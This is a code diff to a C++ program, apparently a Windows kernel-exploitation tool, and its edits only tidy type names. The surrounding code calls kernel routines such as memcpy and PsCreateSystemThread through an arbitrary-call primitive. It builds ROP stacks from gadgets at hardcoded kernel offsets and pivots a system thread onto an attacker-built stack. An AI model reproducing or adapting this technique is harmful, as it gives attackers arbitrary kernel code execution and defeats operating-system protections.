@@ -82,9 +82,9 @@ int main()
         return EXIT_FAILURE;
 
     // Zero out stack allocation
-    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
-    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
-    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);
+    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
+    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
+    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);
 
     // Create usermode event
     const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
@@ -114,7 +114,7 @@ int main()
     MainStackManager.LoopBack();
 
     OBJECT_ATTRIBUTES ObjectAttributesData;
-    InitializeObjectAttributes(&ObjectAttributesData, (PUNICODE_STRING)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+    InitializeObjectAttributes(&ObjectAttributesData, (UNICODE_STRING*)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
@@ -130,12 +130,12 @@ int main()
     // executing. We will just 'ret;' into the first gadget in our new stack.
     BootstrapPivotData.JumpAddress = RetGadgetAddress;
 
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
-    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
+    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());
 
     Sleep(500);
     std::cin.get();
@@ -144,7 +144,7 @@ int main()
     void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);
 
     HANDLE KernelThreadHandle;
-    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, PHANDLE, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
+    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, HANDLE*, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
         "PsCreateSystemThread",
         &KernelThreadHandle,
         THREAD_ALL_ACCESS,
